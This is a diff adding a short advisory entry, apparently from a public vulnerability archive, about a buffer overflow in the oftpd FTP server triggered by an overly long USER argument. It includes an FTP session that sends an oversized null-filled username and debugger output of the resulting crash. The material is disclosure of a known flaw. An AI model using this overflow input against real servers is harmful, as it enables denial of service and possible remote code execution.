@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/14161/info
+
+oftpd is prone to a remotely exploitable buffer overflow. This may be triggered by a client through an overly long argument for the USER command.
+
+Successful exploitation may let a remote attacker execute arbitrary code in the context of the server process. 
+
+530 Only anonymous FTP supported.
+ftp: Login failed.
+ftp> user
+(username)
+usage: user username [password [account]]
+ftp> user \0\0\0\0\0\ (much larger string)
+500 Syntax error, command unrecognized.
+Login failed.
+ftp> user
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x30303054
+0x969b56d8 in history ()
